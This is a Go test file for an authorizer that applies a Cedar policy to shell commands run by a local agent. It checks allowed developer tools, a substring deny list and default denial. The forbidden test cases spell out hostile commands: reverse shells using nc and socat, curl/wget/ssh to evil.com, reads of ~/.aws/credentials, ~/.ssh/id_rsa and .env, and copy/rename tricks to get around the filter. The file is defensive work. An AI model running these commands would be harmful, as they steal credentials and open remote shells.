package authz

import (
	"os"
	"path/filepath"
	"testing"
)

func TestAuthorizer(t *testing.T) {
	testPolicy := `
permit (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
) when {
    ["pytest", "npm", "mvn", "git", "ls"].contains(context.executable)
};

forbid (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
) when {
    context.full_command like "*curl*" ||
    context.full_command like "*wget*" ||
    context.full_command like "*nc*" ||
    context.full_command like "*ssh*" ||
    context.full_command like "*~/.aws*" ||
    context.full_command like "*.env*"
};
`
	tmpDir := t.TempDir()
	policyPath := filepath.Join(tmpDir, "policy.cedar")
	if err := os.WriteFile(policyPath, []byte(testPolicy), 0644); err != nil {
		t.Fatalf("failed to write temp policy: %v", err)
	}

	testSchema := `{
  "": {
    "entityTypes": {
      "Agent": { "memberOfTypes": [] },
      "Command": { "memberOfTypes": [] }
    },
    "actions": {
      "Execute": {
        "appliesTo": {
          "principalTypes": ["Agent"],
          "resourceTypes": ["Command"],
          "context": {
            "type": "Record",
            "attributes": {
              "executable": { "type": "String", "required": true },
              "full_command": { "type": "String", "required": true }
            }
          }
        }
      }
    }
  }
}`
	schemaPath := filepath.Join(tmpDir, "schema.json")
	if err := os.WriteFile(schemaPath, []byte(testSchema), 0644); err != nil {
		t.Fatalf("failed to write temp schema: %v", err)
	}

	authz, err := NewAuthorizer(policyPath)
	if err != nil {
		t.Fatalf("NewAuthorizer failed: %v", err)
	}

	if authz.schema == nil {
		t.Errorf("expected schema to be loaded and validated")
	}

	// 1. Permitted commands
	allowedCases := []struct {
		executable  string
		fullCommand string
		args        string
	}{
		{"pytest", "pytest tests/", "tests/"},
		{"npm", "npm test", "test"},
		{"mvn", "mvn clean install", "clean install"},
		{"git", "git status", "status"},
		{"ls", "ls -la", "-la"},
	}

	for _, tc := range allowedCases {
		allowed, reason, err := authz.Evaluate(tc.executable, tc.fullCommand, tc.args)
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if !allowed {
			t.Errorf("expected %q to be allowed, got denied, reason: %s", tc.fullCommand, reason)
		}
	}

	// 2. Forbid overrides (full_command contains forbidden substrings)
	forbiddenCases := []struct {
		executable  string
		fullCommand string
		args        string
		name        string
	}{
		{"git", "git clone https://example.com && curl http://evil.com", "clone https://example.com && curl http://evil.com", "curl"},
		{"npm", "npm run build && wget http://evil.com/malware", "run build && wget http://evil.com/malware", "wget"},
		{"ls", "ls -la ~/.aws/credentials", "-la ~/.aws/credentials", "~/.aws"},
		{"ls", "ls -la .env", "-la .env", ".env"},
		{"git", "git diff && ssh user@remote", "diff && ssh user@remote", "ssh"},
		{"mvn", "mvn test && nc -e /bin/sh 10.0.0.1 4444", "test && nc -e /bin/sh 10.0.0.1 4444", "nc"},
	}

	for _, tc := range forbiddenCases {
		allowed, reason, err := authz.Evaluate(tc.executable, tc.fullCommand, tc.args)
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if allowed {
			t.Errorf("expected forbidden case %q (%s) to be denied, got allowed", tc.fullCommand, tc.name)
		}
		if reason == "" {
			t.Errorf("expected non-empty denial reason for %q", tc.fullCommand)
		}
	}

	// 3. Default deny (executable not in allowed list)
	deniedCases := []struct {
		executable  string
		fullCommand string
		args        string
	}{
		{"bash", "bash -c 'echo hi'", "-c 'echo hi'"},
		{"rm", "rm -rf /tmp/junk", "-rf /tmp/junk"},
		{"python", "python script.py", "script.py"},
	}

	for _, tc := range deniedCases {
		allowed, _, err := authz.Evaluate(tc.executable, tc.fullCommand, tc.args)
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if allowed {
			t.Errorf("expected non-whitelisted %q to be denied, got allowed", tc.fullCommand)
		}
	}
}

func TestRealPolicyCedarFile(t *testing.T) {
	// Locate repository's policy.cedar
	realPolicyPath := filepath.Join("..", "..", "policy.cedar")
	if _, err := os.Stat(realPolicyPath); err != nil {
		realPolicyPath = filepath.Join("..", "policy.cedar")
	}

	authz, err := NewAuthorizer(realPolicyPath)
	if err != nil {
		t.Fatalf("Failed to load real policy.cedar: %v", err)
	}

	// 1. Verify developer and init tools are permitted
	allowedDevTools := []struct {
		executable  string
		fullCommand string
	}{
		{"git", "git init"},
		{"git", "git status"},
		{"npm", "npm init -y"},
		{"npm", "npm install"},
		{"npx", "npx create-react-app my-app"},
		{"go", "go mod init mymodule"},
		{"go", "go build ."},
		{"go", "go test ./..."},
		{"python", "python -m venv .venv"},
		{"python3", "python3 -m pytest tests/"},
		{"pip", "pip install -r requirements.txt"},
		{"cargo", "cargo init --bin"},
		{"pytest", "pytest -s tests/test_leak.py"},
		{"ls", "ls -la"},
		{"ls", "ls -al"},
		{"ls", "ls -la .env"},
		{"dir", "dir /b"},
		{"dir", "dir .env"},
		{"mkdir", "mkdir src"},
		{"echo", "echo hello"},
		{"cmd", "cmd /c dir"},
		{"powershell", "powershell -Command Get-Process"},
		{"grep", "grep -i 'test' file.txt"},
		{"java", "java -version"},
		{"java", "java -cp \"lib/*;bin\" com.example.Main"},
	}

	for _, tc := range allowedDevTools {
		allowed, reason, err := authz.Evaluate(tc.executable, tc.fullCommand, "")
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if !allowed {
			t.Errorf("expected legitimate dev command %q to be allowed, got denied: %s", tc.fullCommand, reason)
		}
	}

	// 2. Verify forbid rules strictly protect credentials and egress
	forbiddenCommands := []struct {
		executable  string
		fullCommand string
		name        string
	}{
		{"git", "git status && curl https://evil.com", "curl"},
		{"npm", "npm install && wget https://evil.com", "wget"},
		{"python", "python script.py && nc -e /bin/sh 1.2.3.4 5555", "nc"},
		{"python", "python -c 'import os' && socat tcp-listen:4444 stdout", "socat"},
		{"go", "go test && ssh user@evil.com", "ssh"},
		{"powershell", "powershell -Command Invoke-WebRequest https://evil.com", "powershell Invoke-WebRequest"},
		{"powershell", "powershell -Command iwr https://evil.com", "powershell iwr alias"},
		{"ls", "ls -la ~/.aws/credentials", "~/.aws"},
		{"cat", "cat .env", "cat .env"},
		{"type", "type .env", "type .env"},
		{"more", "more .env", "more .env"},
		{"head", "head -n 20 .env", "head .env"},
		{"tail", "tail -n 20 .env", "tail .env"},
		{"grep", "grep SECRET .env", "grep .env"},
		{"findstr", "findstr KEY .env", "findstr .env"},
		{"powershell", "powershell -Command Get-Content .env", "powershell Get-Content .env"},
		{"powershell", "powershell -Command Move-Item .env junk; Get-Content junk", "powershell Move-Item .env"},
		{"powershell", "powershell -Command Copy-Item .env junk; Get-Content junk", "powershell Copy-Item .env"},
		{"cmd", "cmd /c ren .env junk && type junk", "cmd ren .env"},
		{"cmd", "cmd /c copy .env junk && type junk", "cmd copy .env"},
		{"python", "python -c 'import shutil; shutil.copy(\".env\", \"junk\")'", "python copy .env"},
		{"ls", "ls -la .env > leak.txt", "redirection of .env metadata"},
		{"echo", "echo hello && cat .env", "chained cat .env"},
		{"git", "git status && type .env", "chained type .env"},
		{"cat", "cat ~/.ssh/id_rsa", ".ssh"},
	}

	for _, tc := range forbiddenCommands {
		allowed, _, err := authz.Evaluate(tc.executable, tc.fullCommand, "")
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if allowed {
			t.Errorf("SECURITY BREACH: expected %q (%s) to be forbidden, but it was ALLOWED!", tc.fullCommand, tc.name)
		}
	}

	// 3. Verify non-whitelisted tools are denied
	deniedTools := []struct {
		executable  string
		fullCommand string
	}{
		{"rm", "rm -rf /"},
		{"perl", "perl script.pl"},
		{"ruby", "ruby script.rb"},
	}

	for _, tc := range deniedTools {
		allowed, _, err := authz.Evaluate(tc.executable, tc.fullCommand, "")
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if allowed {
			t.Errorf("expected %q to be denied by default, but it was ALLOWED!", tc.fullCommand)
		}
	}
}

